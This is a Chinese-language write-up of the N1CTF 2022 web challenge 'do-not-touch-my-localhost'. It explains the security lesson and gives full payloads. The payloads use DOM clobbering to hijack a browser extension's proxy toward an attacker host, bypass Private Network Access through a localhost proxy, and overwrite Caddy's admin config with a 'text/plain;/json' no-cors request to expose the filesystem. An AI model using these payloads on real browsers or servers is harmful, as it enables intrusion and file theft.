# N1CTF 2022 - do-not-touch-my-localhost

## 题目简述

应用允许用户提交 HTML 笔记并让管理员机器人访问。机器人使用带有自定义代理扩展的 Chrome，并启用了 Private Network Access（PNA）限制。flag 位于容器根目录 `/flag`，外部的 8888 端口由 Caddy 反向代理到 8080 端口的 Gin 应用；Caddy 管理 API 只监听 `127.0.0.1:2019`。

完整利用链包含两个关键点：先通过 DOM clobbering 控制浏览器扩展的代理设置，使页面被视为经本地代理加载并绕过 PNA；再利用 CORS 简单请求与 Caddy Content-Type 检查之间的差异，重写 Caddy 配置为根目录文件服务器。

## 解题过程

### 源码中的攻击面

`viewPage` 把笔记内容强制转换为 `template.HTML`，因此用户内容会作为 HTML 渲染。CSP 为 `default-src 'self'`，不能直接加载外部脚本，但同源的 `/static/js/blocker.js` 可以执行。

扩展的 content script 在页面创建之初注册 `message` 监听器：

```javascript
window.addEventListener("message", function (event) {
  if (event.origin === window.origin && event.data.type === "setProxy") {
    let { hostname, port = "1080" } =
      window.proxy_options ?? event.data.options;
    chrome.runtime.sendMessage({
      type: "setProxy",
      options: { host: hostname, port: parseInt(port) },
    });
  }
});
```

问题在于它优先信任页面全局变量 `window.proxy_options`。页面与扩展脚本处于隔离的 JavaScript world，但共享同一个 DOM；用带有特定 `id` 的元素可以在页面全局命名属性中制造同名对象。

### DOM clobbering 控制代理

构造笔记：

```html
<a id="proxy_options" href="http://ATTACKER_HOST:ATTACKER_PORT"></a>
<script src="/static/js/blocker.js"></script>
<meta http-equiv="refresh" content="1; URL='/exp.html'">
```

`blocker.js` 会发送 `setProxy` 消息：

```javascript
window.postMessage({
  type: "setProxy",
  options: { hostname: "1.2.3.4", port: 12345 },
}, "*");
```

由于 `proxy_options` 被同名 `<a>` 污染，content script 读取到的是攻击者 URL 中的 `hostname` 和 `port`，最终让扩展把浏览器固定代理切换到攻击者服务器。meta refresh 随后访问同源路径 `/exp.html`，请求经过该代理，攻击者可以返回下一阶段 HTML；浏览器地址仍保持题目站点的 origin。

### 用本地代理绕过 PNA

根据 [PNA 对代理请求的定义](https://wicg.github.io/private-network-access/#proxies)，使用代理加载的页面会按代理服务器地址判断其所在地址空间。第二阶段先把代理改为机器人本机的 `127.0.0.1:8080`：

```javascript
window.postMessage({
  type: "setProxy",
  options: { hostname: "127.0.0.1", port: 8080 },
}, "*");
```

随后创建一个未缓存的同源 404 iframe。它通过本地代理加载，因此 iframe 的网络上下文被视为来自本机；同时它仍与父页面同源，可以取得其 `eval`：

```javascript
const iframe = document.createElement("iframe");
iframe.src = "/404";
document.body.appendChild(iframe);
```

在 iframe 中发起到 `127.0.0.1:2019` 的请求，就能越过原本阻止公网页面访问本地管理端口的 PNA 检查。

### 绕过 Caddy 的 Content-Type 检查

Caddy 管理 API 的 `/config/` 接口允许用 POST 替换配置。目标版本只检查请求头是否包含字符串 `/json`：

```go
if ct := r.Header.Get("Content-Type"); !strings.Contains(ct, "/json") {
    return fmt.Errorf("unacceptable content-type")
}
```

跨域且不触发预检的请求只能使用 CORS safelist 中的方法和头部。`text/plain` 是允许的 Content-Type essence，而媒体类型参数不会改变它；因此使用：

```text
Content-Type: text/plain;/json
```

浏览器把它视为 `text/plain` 简单请求，Caddy 的字符串检查却能找到 `/json`，于是正文仍被当作 JSON 配置处理。

完整的第二阶段如下：

```html
<!doctype html>
<body>
<script>
window.postMessage({
  type: "setProxy",
  options: { hostname: "127.0.0.1", port: 8080 },
}, "*");

setTimeout(() => {
  const iframe = document.createElement("iframe");
  iframe.src = "/404";
  document.body.appendChild(iframe);

  setTimeout(() => {
    const config = {
      apps: {
        http: {
          http_port: 8888,
          https_port: 8443,
          servers: {
            srv0: {
              listen: [":8888"],
              routes: [{
                handle: [
                  { handler: "vars", root: "/" },
                  { handler: "file_server", browse: {} },
                ],
                terminal: true,
              }],
              automatic_https: { disable_redirects: true },
            },
          },
        },
      },
    };

    const source = `fetch("http://127.0.0.1:2019/config/", {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "text/plain;/json" },
      body: JSON.stringify(${JSON.stringify(config)}),
    })`;
    iframe.contentWindow.eval(source);
  }, 100);
}, 100);
</script>
</body>
```

实际利用时也可以直接把配置 JSON 写进传给 `eval` 的字符串，避免模板插值层级。配置生效后，Caddy 的 8888 端口不再反向代理 Gin，而是以 `/` 为根目录提供文件服务，访问 `/flag` 即可读取 flag。

题目使用的接口语义可参考 [Caddy 管理 API](https://caddyserver.com/docs/api)，但利用所依赖的是附件版本源码中的宽松字符串检查；新版行为需要重新验证。

## 方法总结

本题把浏览器侧和服务端配置面串成一条链：HTML 注入经 DOM clobbering 影响扩展，扩展代理改变 PNA 的地址空间判断，同源 iframe 提供可执行上下文，最后用 `text/plain;/json` 同时满足 CORS 简单请求和 Caddy 的错误校验。分析这类 bot 题时，应同时画出页面 world、扩展 world、代理地址、origin、PNA 地址空间和内网管理接口，单看传统 XSS 或 SSRF 都不足以解释完整利用。
